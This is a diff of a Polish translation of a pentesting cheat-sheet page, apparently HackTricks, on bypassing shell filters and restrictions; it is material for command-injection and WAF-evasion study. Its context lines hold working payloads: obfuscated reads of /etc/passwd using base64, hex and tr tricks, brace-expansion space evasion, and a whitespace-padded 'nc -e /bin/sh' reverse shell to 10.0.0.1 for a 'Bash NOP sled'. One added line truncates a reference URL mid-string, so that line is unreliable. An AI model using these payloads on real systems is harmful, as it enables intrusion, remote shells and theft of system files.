@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Ominięcie zabronionych spacji
+### Obejście zabronionych spacji
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Ominięcie za pomocą kodowania szesnastkowego
+### Ominięcie z kodowaniem szesnastkowym
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -296,7 +296,7 @@ ln /f*
 ```
 ## Bypass tylko do odczytu/brak wykonania/bez dystrybucji
 
-Jeśli znajdujesz się w systemie plików z **ochronami tylko do odczytu i brakiem wykonania** lub nawet w kontenerze bez dystrybucji, wciąż istnieją sposoby na **wykonanie dowolnych binarnych plików, nawet powłoki!:**
+Jeśli znajdujesz się w systemie plików z **ochronami tylko do odczytu i brakiem wykonania** lub nawet w kontenerze bez dystrybucji, nadal istnieją sposoby na **wykonanie dowolnych binarnych, nawet powłoki!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -308,17 +308,17 @@ bypass-fs-protections-read-only-no-exec-distroless/
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Oparcie na przestrzeni Bash NOP Sled ("Bashsledding")
+## NOP Sled oparty na przestrzeni ("Bashsledding")
 
-Gdy luka pozwala ci częściowo kontrolować argument, który ostatecznie trafia do `system()` lub innej powłoki, możesz nie znać dokładnego przesunięcia, w którym wykonanie zaczyna odczytywać twój ładunek. Tradycyjne NOP sleds (np. `\x90`) **nie** działają w składni powłoki, ale Bash zignoruje wiodące białe znaki przed wykonaniem polecenia.
+Gdy luka pozwala ci częściowo kontrolować argument, który ostatecznie trafia do `system()` lub innej powłoki, możesz nie znać dokładnego przesunięcia, w którym wykonanie zaczyna odczytywać twój ładunek. Tradycyjne NOP sledy (np. `\x90`) **nie** działają w składni powłoki, ale Bash zignoruje wiodące białe znaki przed wykonaniem polecenia.
 
-Dlatego możesz stworzyć *NOP sled dla Basha* poprzez dodanie długiej sekwencji spacji lub znaków tabulacji przed swoim rzeczywistym poleceniem:
+Dlatego możesz stworzyć *NOP sled dla Basha*, poprzedzając swoje prawdziwe polecenie długą sekwencją spacji lub znaków tabulacji:
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Jeśli łańcuch ROP (lub jakikolwiek prymityw pamięciowy) umieści wskaźnik instrukcji gdziekolwiek w obrębie bloku przestrzeni, parser Bash po prostu pomija białe znaki, aż dotrze do `nc`, niezawodnie wykonując twoje polecenie.
+Jeśli łańcuch ROP (lub jakikolwiek prymityw korupcji pamięci) umieści wskaźnik instrukcji gdziekolwiek w obrębie bloku przestrzeni, parser Bash po prostu pomija białe znaki, aż dotrze do `nc`, niezawodnie wykonując twoje polecenie.
 
 Praktyczne przypadki użycia:
 
@@ -333,7 +333,7 @@ Praktyczne przypadki użycia:
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
